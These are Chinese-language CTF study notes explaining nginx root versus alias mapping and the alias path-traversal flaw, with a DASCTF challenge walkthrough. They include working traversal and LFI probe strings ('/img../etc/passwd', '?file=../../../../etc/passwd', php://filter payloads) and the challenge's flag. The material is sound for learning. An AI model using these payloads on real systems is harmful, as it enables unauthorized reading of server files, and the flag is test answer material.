# Web笔记11-nginx基础与alias穿越（专项）

> 来源：DASCTF u1s1 题 + 学生疑问 ｜ 日期：2026-08-01
> 对应专栏：hc-web/dir_traversal.md、any_file_read.md（nginx 配置漏洞线）

## 一、nginx 是什么？（和 PHP 的区别）

| | nginx | PHP |
|---|---|---|
| 是什么 | **服务器程序**（收请求、发响应） | **编程语言/解释器**（生成动态内容） |
| 类比 | 餐厅前台接待 | 厨房厨师 |
| 干什么 | 静态文件直接给；动态请求转给 PHP | 执行 PHP 代码出结果 |

```
浏览器请求 → nginx（前台）：
  ├─ 静态文件（.html .gif .css）→ 直接从仓库拿给你
  └─ 动态（.php）→ 转交 PHP 执行 → 结果经 nginx 返回
```

**判断技术栈**：响应头有 `X-Powered-By: PHP` = 有 PHP；只有 `Server: nginx/openresty` = 纯静态 → 漏洞往"配置"方向想（这题就是！）

## 二、nginx 的两种映射方式（核心！）

nginx 配置里 `location` + `root`/`alias` 决定"URL 对应哪个文件"。

### root —— 完整拼接
```nginx
location /img {
    root /var/www/;
}
```
```
请求 /img/a.gif → 拼成 /var/www/ + /img/a.gif = /var/www/img/a.gif
```
**公式：root 路径 + 完整URL路径**

### alias —— 前缀替换
```nginx
location /img {
    alias /tmp/;
}
```
```
请求 /img/a.gif → 把前缀 /img 换成 /tmp/ → /tmp/a.gif
```
**公式：alias 路径 + URL 去掉前缀的剩余部分**

### 对比表（拿同一请求 /img/a.gif 举例）

| | root /var/www/ | alias /tmp/ |
|---|---|---|
| 实际找的文件 | `/var/www/img/a.gif` | `/tmp/a.gif` |
| 逻辑 | 路径 + 完整URL | 前缀替换，其余原样 |
| 漏洞风险 | 低（一般正常） | **高（不检查剩余 `../`）** |

### 关键：alias 的坑在"剩下什么不管"

alias 只是把 `/img` 换成 `/tmp/`，**URL 里剩余的部分（包括 `../`）原样拼上**：

```
请求 /img../etc/passwd
  → /tmp/ + ../etc/passwd
  → /tmp/../etc/passwd = /etc/passwd   ← 越权！
```

## 三、alias 穿越漏洞（u1s1 题）

### 漏洞配置
```nginx
location /img {          # 前缀匹配，没有结尾斜杠
    alias /tmp/;         # alias 路径带结尾斜杠
}
```

### 原理
```
alias 前缀替换 + 剩余路径不校验 ../ 
→ 一个 ../ 退回根目录 → 任意文件读取
```

### 探测/利用公式
```
<映射前缀>../<目标文件>
/img../etc/passwd   → /etc/passwd ✅（万能验证）
/img../flag         → /flag ✅（读 flag）
/img../             → 根目录目录列表（可能直接列出所有文件！）
```

### 什么时候想到这招
- 纯静态站（无 PHP）+ 目录列表开着
- 目录名与内容"对不上"（/img/ 里出现奇怪的东西）
- nginx/openresty 响应头 + 某个目录可列 → 试 alias 穿越

## 四、目录列表（autoindex）

- `autoindex on` 配置 → 访问目录返回文件清单（Index of /xxx/）
- **攻击面提示**：能列目录 = 配置宽松 = 可能还有别的坑（如 alias 穿越）
- 目录可列 = 名单白送，不用猜文件名

## 五、目录穿越套路总表（读文件家族）

| 套路 | 触发点 | 探测公式 |
|---|---|---|
| 路径穿越 | 读文件参数 ?file= | `?file=../../../../etc/passwd` |
| PHP LFI | include 参数 ?p= | `php://filter/convert.base64-encode/resource=index.php` |
| nginx alias 穿越 | 映射目录 /img/ | `/img../etc/passwd` |
| zip 伪协议 | PHP include | `zip://xxx.zip#file` |

**万能验证**：先读 `/etc/passwd`（Linux 必有）→ 实锤 → 再读 flag

**工具**：ffuf/wfuzz/dirsearch（fuzz 路径参数）、liffy/kadimus（LFI 专用）、Burp（手动改包）
（没有万能一键工具，套路+手动构造是核心）

## 六、u1s1 题速览

```
① 页面极简静态 + img/ 目录可列（只有 img.gif）
② 猜测 nginx alias 映射
③ /img../etc/passwd → 出系统文件 = 实锤
④ /img../flag → n1book{afr_2_solved}
```

详见：`web/WP-[DASCTF]u1s1-nginx-alias穿越.md`

## 七、易错点

- alias 穿越对**前缀匹配 location 且无结尾斜杠**最危险
- root 也有拼接风险但场景不同（别混）
- 穿越后目录列表可能也开（/img../ 列出根目录）→ 直接用，别猜文件名
- nginx 配置错误 ≠ PHP 漏洞：先分清楚技术栈再选攻击方向
